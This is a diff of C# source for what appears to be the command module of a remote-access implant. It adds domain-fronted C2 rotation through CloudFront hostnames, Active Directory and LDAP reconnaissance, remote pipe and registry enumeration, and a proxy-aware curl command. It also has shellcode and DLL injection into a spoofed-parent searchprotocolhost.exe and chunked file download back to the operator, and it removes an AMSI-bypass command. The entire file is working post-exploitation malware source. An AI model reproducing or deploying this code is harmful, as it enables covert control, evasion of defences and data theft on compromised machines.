@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -12,6 +12,7 @@ using System.Diagnostics;
 using Core.Common;
 using System.Security.Cryptography;
 using System.Threading.Tasks;
+using System.Runtime.InteropServices;
 
 namespace Core
 {
@@ -31,6 +32,7 @@ namespace Core
             Program.PrintHelp();
         }
 
+
         [CoreDispatch(Description = "Used for testing arguments and output", Usage = "Usage: Echo \"Param1\" \"Param2\"")]
         public static void echo(string[] args)
         {
@@ -44,6 +46,80 @@ namespace Core
                 Console.WriteLine($"ArgKey: {arg.Key}");
                 Console.WriteLine($"ArgValue: {arg.Value}");
             }
+        }
+
+        [CoreDispatch(Description = "Used for setting up comms dfupdate rotation", Usage = "Usage: dfupdate \"d36xb1r83janbu.cloudfront.net\",\"d2argm04ypulrn.cloudfront.net\"")]
+        public static void dfupdate(string[] args)
+        {
+            Comms.DFUpdate(args[1]);
+        }
+
+        [CoreDispatch(Description = "Used to get comms rotation values", Usage = "Usage: get-dfupdate")]
+        public static void getrotation()
+        {
+            var x = Comms.GetRotate();
+            foreach (var y in x)
+            {
+                Console.WriteLine($"Rotation: {y}");
+            }
+
+            var xx = Comms.GetDF();
+            foreach (var yy in xx)
+            {
+                Console.WriteLine($"DomainFront: {yy}");
+            }
+        }
+
+        //LocalGroupMember(string Computer, string GroupName)
+
+        [CoreDispatch(Description = "Performs an WinNT GroupName Query", Usage = "Usage: localgroupmember server1.blorebank.local administrators")]
+        public static void localgroupmember(string[] args)
+        {
+            try
+            {
+                if (args.Length > 2)
+                {
+                    ActiveDirectory.AD.LocalGroupMember(args[1], args[2]);
+                }
+                else
+                {
+                    ActiveDirectory.AD.LocalGroupMember(args[1], null);
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Error running localgroupmember: {e}");
+            }
+        }
+
+        [CoreDispatch(Description = "Performs an LDAP Search Query", Usage = "Usage: Ldap-Searcher \"(&(objectCategory=user)(samaccountname=user))\" \"LDAP://bloredc1.blorebank.local/DC=blorebank,DC=local\"")]
+        public static void ldapsearcher(string[] args)
+        {
+            try
+            {
+                if (args.Length > 3)
+                {
+                    ActiveDirectory.AD.ADSearcher(args[1], args[2], args[3]);
+                }
+                else if (args.Length > 2)
+                {
+                    ActiveDirectory.AD.ADSearcher(args[1], args[2], null);
+                }
+                else
+                {
+                    ActiveDirectory.AD.ADSearcher(args[1], null, null);
+                }                
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Error running ADSearcher: {e}");
+            }
+        }
+
+        [CoreDispatch(Description = "Used for setting up comms host rotation", Usage = "Usage: rotate \"https://d36xb1r83janbu.cloudfront.net\",\"https://d2argm04ypulrn.cloudfront.net\"")]
+        public static void rotate(string[] args)
+        {
+            Comms.Rotate(args[1]);
         }
 
         [CoreDispatch(Description = "Performs a screenshot of the open desktop", Usage = "Usage: Get-Screenshot")]
@@ -70,89 +146,6 @@ namespace Core
             {
                 Console.WriteLine($"[-] Cannot perform screen capture: {e}");
             }
-        }
-
-
-        [CoreDispatch(Description = "Used to stop monitoring the power status of the machine", Usage = "Usage: StopPowerStatus")]
-        public static void stoppowerstatus()
-        {
-            Assembly lTyp = null;
-            try
-            {
-                lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "dropper_cs");
-            }
-            catch (NullReferenceException)
-            {
-
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine($"[-] Error in stoppowerstatus: {e}");
-            }
-            try
-            {
-                lTyp.GetType("Program").GetField("Run", BindingFlags.Public | BindingFlags.Static).SetValue(null, false);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine($"[-] Error in stoppowerstatus: {e}");
-            }
-            Console.WriteLine("[-] Stopped powerstatus checking");
-        }
-
-        [CoreDispatch(Description = "Used for start monitoring the power status of the machine", Usage = "Usage: LoadPowerStatus")]
-        public static void loadpowerstatus()
-        {
-            try
-            {
-                var asm = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "PwrStatusTracker");
-                var t = asm.GetType("PwrStatusTracker.PwrFrm");
-                var tpwn = asm.GetType("PwrStatusTracker.PwrNotifier");
-                dynamic pwnr = System.Activator.CreateInstance(tpwn);
-                var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "dropper_cs");
-                var taskIdstr = lTyp.GetType("Program").GetField("taskId").GetValue(null);
-                pwnr.taskid = $"{taskIdstr.ToString()}-pwrstatusmsg";
-                var m = t.GetMethod("CreatePwrFrmAsync");
-                var pfrm = m.Invoke(null, new object[] { pwnr });
-            }
-            catch (NullReferenceException)
-            {
-
-            }
-            catch (Exception e)
-            {
-                Comms.Exec($"[-] Error in loadpowerstatus: {e}");
-            }
-
-        }
-
-
-        [CoreDispatch(Description = "Used for setting up comms dfupdate rotation", Usage = "Usage: dfupdate \"d36xb1r83janbu.cloudfront.net\",\"d2argm04ypulrn.cloudfront.net\"")]
-        public static void dfupdate(string[] args)
-        {
-            Comms.DFUpdate(args[1]);
-        }
-
-        [CoreDispatch(Description = "Used to get comms rotation values", Usage = "Usage: get-dfupdate")]
-        public static void getrotation()
-        {
-            var x = Comms.GetRotate();
-            foreach (var y in x)
-            {
-                Console.WriteLine($"Rotation: {y}");
-            }
-
-            var xx = Comms.GetDF();
-            foreach (var yy in xx)
-            {
-                Console.WriteLine($"DomainFront: {yy}");
-            }
-        }
-
-        [CoreDispatch(Description = "Used for setting up comms host rotation", Usage = "Usage: rotate \"https://d36xb1r83janbu.cloudfront.net\",\"https://d2argm04ypulrn.cloudfront.net\"")]
-        public static void rotate(string[] args)
-        {
-            Comms.Rotate(args[1]);
         }
 
         [CoreDispatch(Description = "Performs a screenshot of the users desktop every x minutes/seconds indefinitely untill Stop-ScreenshotMulti is run", Usage = "Usage: Get-ScreenshotMulti 2m")]
@@ -274,7 +267,7 @@ namespace Core
                             var ChunkedByte = System.Text.Encoding.UTF8.GetBytes(ChunkStr);
                             var preNumbers = new byte[10];
                             preNumbers = Common.Core.Combine(ChunkedByte, totalChunkByte);
-                            var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name.Contains("dropper_cs"));
+                            var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "ConfigManager");
                             Comms.Exec("", Common.Core.Combine(preNumbers, ms.ToArray()));
                             Chunk++;
                             ms.SetLength(0);
@@ -287,7 +280,60 @@ namespace Core
                 Console.WriteLine($"[-] Cannot download-file: {e}");
             }
         }
-        
+
+        [CoreDispatch(Description = "Used to stop monitoring the power status of the machine", Usage = "Usage: StopPowerStatus")]
+        public static void stoppowerstatus()
+        {
+            Assembly lTyp = null;
+            try
+            {
+                lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "ConfigManager");
+            }
+            catch (NullReferenceException)
+            {
+
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Error in stoppowerstatus: {e}");
+            }
+            try
+            {
+                lTyp.GetType("Program").GetField("Lop", BindingFlags.Public | BindingFlags.Static).SetValue(null, false);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Error in stoppowerstatus: {e}");
+            }
+            Console.WriteLine("[-] Stopped powerstatus checking");
+        }
+
+        [CoreDispatch(Description = "Used for start monitoring the power status of the machine", Usage = "Usage: LoadPowerStatus")]
+        public static void loadpowerstatus()
+        {
+            try
+            {
+                var asm = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "PwrStatusTracker");
+                var t = asm.GetType("PwrStatusTracker.PwrFrm");
+                var tpwn = asm.GetType("PwrStatusTracker.PwrNotifier");
+                dynamic pwnr = System.Activator.CreateInstance(tpwn);
+                var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "ConfigManager");
+                var taskIdstr = lTyp.GetType("Program").GetField("taskId").GetValue(null);
+                pwnr.taskid = $"{taskIdstr.ToString()}-pwrstatusmsg";
+                var m = t.GetMethod("CreatePwrFrmAsync");
+                var pfrm = m.Invoke(null, new object[] { pwnr });
+            }
+            catch (NullReferenceException)
+            {
+
+            }
+            catch (Exception e)
+            {
+                Comms.Exec($"[-] Error in loadpowerstatus: {e}");
+            }
+
+        }
+
         [CoreDispatch(Description = "Used to kill a target process", Usage = "Usage: Kill-Process 1357")]
         public static void killprocess(string[] args)
         {
@@ -302,6 +348,8 @@ namespace Core
                 Console.WriteLine($"[-] Failed to terminate process: {e}");
             }
         }
+
+
 
         [CoreDispatch(Description = "Used to start a portscan against a target", Usage = "Usage: PortScan \"Host1,Host2\" \"80,443,3389\" \"1\" \"100\"")]
         public static void portscan(string[] args)
@@ -321,7 +369,7 @@ namespace Core
 
             var lTyp = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "PortScanner-Dll");
             var t = lTyp.GetType("PortScanner_Dll.Scanner.TCPConnectScanner");
-
+            
             dynamic pwnr = System.Activator.CreateInstance(t);
             object[] argObj = { args[1], args[2], iDelay, iThreads, false, true, -1, false };
             var m = t.GetMethod("PerformTCPConnectScan");
@@ -511,6 +559,7 @@ namespace Core
                     System.IO.File.Delete(@"" + args[2].Replace("\"", ""));
                 }
                 System.IO.File.Move(@"" + args[1].Replace("\"", ""), @"" + args[2].Replace("\"", ""));
+                Console.WriteLine($"[+] Moved successfully to {args[2]} ");
             }
             catch (Exception e)
             {
@@ -523,9 +572,9 @@ namespace Core
         {
             try
             {
-                if (System.IO.File.Exists(@"" + args[2].Replace("\"", "")))
+                if (System.IO.File.Exists(@"" + args[1].Replace("\"", "")))
                 {
-                    System.IO.File.Copy(@"" + args[2].Replace("\"", ""), @"" + args[3].Replace("\"", ""));
+                    System.IO.File.Copy(@"" + args[1].Replace("\"", ""), @"" + args[2].Replace("\"", ""));
                 }
             }
             catch (Exception e)
@@ -704,6 +753,10 @@ namespace Core
             try
             {
                 Host.Get_UserInfo.Run();
+                Console.WriteLine("\n===================================\nAadJoinInformation\n===================================");
+                ActiveDirectory.AD.getaadjoininformation();
+                Console.WriteLine("\n===================================\nOSInformation\n===================================");
+                getosversion();
             }
             catch (Exception e)
             {
@@ -816,6 +869,23 @@ namespace Core
             try
             {
                 var pipes = System.IO.Directory.GetFiles(@"\\.\\pipe\\");
+                foreach (var item in pipes)
+                {
+                    Console.WriteLine(item.ToString());
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Cannot get pipe listing: {e}");
+            }
+        }
+
+        [CoreDispatch(Description = "Used to perform a pipe listing of the local server", Usage = "Usage: ls-remotepipes server1")]
+        public static void lsremotepipes(string[] args)
+        {
+            try
+            {
+                var pipes = System.IO.Directory.GetFiles($"\\\\{args[0]}\\pipe\\\\");
                 foreach (var item in pipes)
                 {
                     Console.WriteLine(item.ToString());
@@ -947,13 +1017,65 @@ namespace Core
         {
             try
             {
-                string c = ProcessHandler.ProcHandler.GetProcesses();
-                Console.WriteLine(c);
+                string strProcList = ProcessHandler.ProcHandler.GetProcesses();
+                Console.WriteLine(strProcList);
             }
             catch (Exception e)
             {
                 Console.WriteLine($"[-] Cannot get process list: {e}");
             }
+        }
+
+        [CoreDispatch(Description = "Looks for a specific process on the target system", Usage = "Usage: Get-Process <name of process>")]
+        public static void getprocess(string[] args)
+        {
+            try
+            {
+                string strProcList = ProcessHandler.ProcHandler.GetProcesses();
+                using (StringReader reader = new StringReader(strProcList))
+                {
+                    string line;
+                    while ((line = reader.ReadLine()) != null)
+                    {
+                        if (line.ToLower().Contains(args[1].ToLower()))
+                        {
+                            Console.WriteLine(line);
+                        }
+                    }
+                }
+
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Cannot get process list: {e}");
+            }
+        }
+
+
+
+        [CoreDispatch(Description = "Used to list dll's loaded in any process", Usage = "Usage: DllSearcher clr.dll mscoree.dll")]
+        public static void dllsearcher(string[] args)
+        {
+            List<string> checks = new List<string>();
+            if (args.Length > 4)
+            {
+                Console.WriteLine("Limited to Max 3 search items");
+            }
+            else
+            {
+                foreach (string i in args)
+                { 
+                    if (!string.IsNullOrEmpty(i)) {checks.Add(i.ToLower()); }
+                }
+                try
+                {
+                    ProcessHandler.ProcHandler.DllSearcher(checks);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine($"[-] Cannot DllSearcher: {e}");
+                }
+            }       
         }
 
         [CoreDispatch(Description = "Gets the users idle time", Usage = "Usage: Get-IdleTime")]
@@ -970,16 +1092,30 @@ namespace Core
             }
         }
 
+        //getaadjoininformation
+        [CoreDispatch(Description = "GetAadJoinInformation to return same output as dsregcmd /status", Usage = "Usage: GetAadJoinInformation")]
+        public static void getaadjoininformation()
+        {            
+            try
+            {
+                ActiveDirectory.AD.getaadjoininformation();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Cannot GetAadJoinInformation: {e}");
+            }
+        }
+
         [CoreDispatch(Description = "Injects shellcode into a new or existing process using rtlcreatuserthread, then createremotethread", Usage = "Usage: Inject-Shellcode <base64-shellcode> <pid/path> <ppid>")]
         public static void injectshellcode(string[] args)
         {
             InjectShellcode(args);
         }
 
-        [CoreDispatch(Description = "Attempts to Bypass Amsi", Usage = "Usage: Bypass-Amsi")]
-        public static void bypassamsi()
+        [CoreDispatch(Description = "Injects a DLL from disk into a new or existing process", Usage = "Usage: Inject-DLL <dll-location> <pid/path> <ppid>")]
+        public static void injectdll(string[] args)
         {
-            Console.WriteLine(ProcessHandler.Hook.BypassAMSI());
+            InjectDll(args);
         }
 
         [CoreDispatch(Description = "Gets the service permissions of the host and outputs a report in the given location", Usage = "Usage: Get-ServicePerms c:\\temp\\")]
@@ -1039,6 +1175,152 @@ namespace Core
             }
         }
 
+        [CoreDispatch(Description = "FindFile using WMI CIM_DataFile, args are name of file and extension", Usage = "Usage: FindFile <filename, e.g. flag> <extension, txt> <drive-optional, e.g. c:> <hostname-optional, e.g. 127.0.0.1>")]
+        public static void findfile(string[] args)
+        {
+            try
+            {                
+                if (args.Length == 3)
+                {
+                    Console.WriteLine($"[>] Trying to find file: {args[1]} {args[2]}");
+                    Common.Core.FindFile(args[1], args[2]);
+                }
+                if (args.Length == 4)
+                {
+                    Console.WriteLine($"[>] Trying to find file: {args[1]} {args[2]} {args[3]}");
+                    Common.Core.FindFile(args[1], args[2], args[3]);
+                }
+                if (args.Length == 5)
+                {
+                    Console.WriteLine($"[>] Trying to find file: {args[1]} {args[2]} {args[3]} {args[4]}");
+                    Common.Core.FindFile(args[1], args[2], args[3], args[4]);
+                }
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[-] Error trying to find file: " + e);
+            }
+        }
+        [CoreDispatch(Description = "LsRegHKCU a value, e.g. SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", Usage = "Usage: LsRegHKCU SOFTWARE\\Classes\\CLSID")]
+        public static void lsreghkcu(string[] args)
+        {
+            try
+            {
+                Console.WriteLine($"[>] Trying to read registry: {args[1]}");
+                Common.Reg.LsReg(args[1], "HKEY_CURRENT_USER");
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[-] Error trying to run LsRegRead: " + e);
+            }
+        }
+
+        [CoreDispatch(Description = "LsRegHKLM a value, e.g. SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", Usage = "Usage: LsRegHKLM SOFTWARE\\Classes\\CLSID")]
+        public static void lsreghklm(string[] args)
+        {
+            try
+            {
+                Console.WriteLine($"[>] Trying to read registry: {args[1]}");
+                Common.Reg.LsReg(args[1], "HKEY_LOCAL_MACHINE");
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[-] Error trying to run LsRegRead: " + e);
+            }
+        }
+        [CoreDispatch(Description = "LsReg HKEY_LOCAL_MACHINE a value, e.g. SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", Usage = "Usage: LsReg HKEY_LOCAL_MACHINE SOFTWARE\\Classes\\CLSID")]
+        public static void lsreg(string[] args)
+        {
+            try
+            {
+                Console.WriteLine($"[>] Trying to read registry: {args[1]}");
+                Common.Reg.LsReg(args[2], args[1].ToUpper());
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[-] Error trying to run LsRegRead: " + e);
+            }
+        }
+
+        [CoreDispatch(Description = "RedRead a value, e.g. HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", Usage = "Usage: RegRead HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall <keyname>")]
+        public static void regread(string[] args)
+        {
+            try
+            {
+                Console.WriteLine($"[>] Trying to read registry: {args[1]} {args[2]}");
+                Common.Reg.ReadReg(args[1], args[2]);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[-] Error trying to run RedRead: " + e);
+            }
+        }
+        [CoreDispatch(Description = "Lists the UninstallString for each key under HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", Usage = "Usage: RegReadUninstall")]
+        public static void regreaduninstall()
+        {
+            try
+            {
+                Console.WriteLine($"[>] Trying to read registry: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
+                Common.Reg.RegReadUninstall();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[-] Error trying to run RedRead: " + e);
+            }
+        }
+
+        [CoreDispatch(Description = "Returns the OS Version using OSVERSIONINFOEXW", Usage = "Usage: GetOSVersion")]
+        public static void getosversion()
+        {
+            try
+            {                
+                var wver = ProcessHandler.Hook.GetWinVer();
+                var cver = ProcessHandler.Hook.GetCurrentVer();
+                var pname = ProcessHandler.Hook.GetProductName();
+                Console.WriteLine($"{pname} \nReleaseId {wver} \nCurrentVersion {cver}\n");
+                Injection.SysCall.GetOSVersion();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-] Error trying to run GetOSVersion: {e.Message}");
+            }
+        }
+
+        [CoreDispatch(Description = "Curl https://www.google.co.uk", Usage = "Usage: Curl https://www.google.co.uk <domain-front-header-optional> <proxy-optional> <proxy-user-optional> <proxy-pass-optional>")]
+        public static void curl(string[] args)
+        {
+            try
+            {
+                Console.WriteLine($"[>] Trying to load URL {args[1]}");
+                string html = null;
+                if (args.Length == 2)
+                {
+                    html = Common.WebRequest.Curl().DownloadString(args[1]);
+                }
+                else if (args.Length == 3)
+                {
+                    html = Common.WebRequest.Curl(args[2]).DownloadString(args[1]);
+                }
+                else if (args.Length == 4)
+                {
+                    html = Common.WebRequest.Curl(args[2], args[3]).DownloadString(args[1]);
+                }
+                else if (args.Length == 5)
+                {
+                    html = Common.WebRequest.Curl(args[2], args[3], args[4]).DownloadString(args[1]);
+                }
+                else if (args.Length == 6)
+                {
+                    html = Common.WebRequest.Curl(args[2], args[3], args[4], args[5]).DownloadString(args[1]);
+                }
+                Console.WriteLine(html);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[-] Error trying to load URL: " + e);
+            }
+        }
+        //RegReadUninstall
         //////////////////////////////////
         //        METHODS TO MOVE       //
         //////////////////////////////////
@@ -1075,7 +1357,7 @@ namespace Core
                 foreach (var xx in x)
                 {
                     try
-                    {
+                    {                       
                         var fInfo = new FileInfo(xx);
                         Console.WriteLine("{0} {1}  {2} {3}  {4}", fInfo.LastWriteTimeUtc.ToLongDateString().PadRight(20), fInfo.LastWriteTimeUtc.ToLongTimeString().PadRight(15), (fInfo.Length).ToString().PadRight(13), ("(" + ((long)fInfo.Length / 1024).ToString() + "k)").PadRight(15), fInfo.FullName);
                     }
@@ -1184,8 +1466,8 @@ namespace Core
 
                 if (args.Length < 3)
                 {
-                    path = @"c:\windows\system32\netsh.exe";
-                    Console.WriteLine("[-] Missing Path or PID parameter using " + path);
+                    path = @"c:\windows\system32\searchprotocolhost.exe";
+                    Console.WriteLine(" > [-] Missing Path or PID parameter starting process: " + path);
                     pid = (int)Injection.PPIDSpoofer.SharpCreateProcess(ppid, path, true);
                 }
                 else
@@ -1212,7 +1494,6 @@ namespace Core
                 Console.WriteLine("[-] Error: " + e);
             }
         }
-      
         static void InjectDll(string[] args)
         {
             try
@@ -1223,7 +1504,7 @@ namespace Core
 
                 if (args.Length < 3)
                 {
-                    path = @"c:\windows\system32\netsh.exe";
+                    path = @"c:\windows\system32\searchprotocolhost.exe";
                     Console.WriteLine("[-] Missing Path or PID parameter using " + path);
                     pid = (int)Injection.PPIDSpoofer.SharpCreateProcess(ppid, path, true);
                 }
